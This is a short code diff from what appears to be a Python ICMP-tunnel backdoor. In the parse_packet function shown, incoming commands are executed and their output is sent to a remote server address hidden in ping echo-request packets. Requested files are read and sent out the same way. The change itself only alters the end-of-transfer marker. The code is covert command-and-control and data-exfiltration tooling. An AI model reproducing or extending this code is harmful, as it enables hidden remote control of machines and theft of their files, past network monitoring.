@@ -30,12 +30,12 @@ def parse_packet(packet):
             pkt_send(SERVER_ADR,data_recieved,"echo-request",id_packet=BEGIN_OUTPUT)
             output = RunCommand(data_recieved)
             pkt_send(SERVER_ADR,output,"echo-request",id_packet=IN_TRANSFER)
-            pkt_send(SERVER_ADR,data=EF,type_packet="echo-request",id_packet=EF)
+            pkt_send(SERVER_ADR,"garbage","echo-request",id_packet=EF)
         elif type_packet == FILE:
             pkt_send(SERVER_ADR,data_recieved,"echo-request",id_packet=BEGIN_FILE)
             output = read_file(data_recieved)
             pkt_send(SERVER_ADR,output,"echo-request",id_packet=IN_TRANSFER)
-            pkt_send(SERVER_ADR,data=EF,type_packet="echo-request",id_packet=EF)
+            pkt_send(SERVER_ADR,"garbage","echo-request",id_packet=EF)
 
         cond = 0
         print("cond changed to " + str(cond))
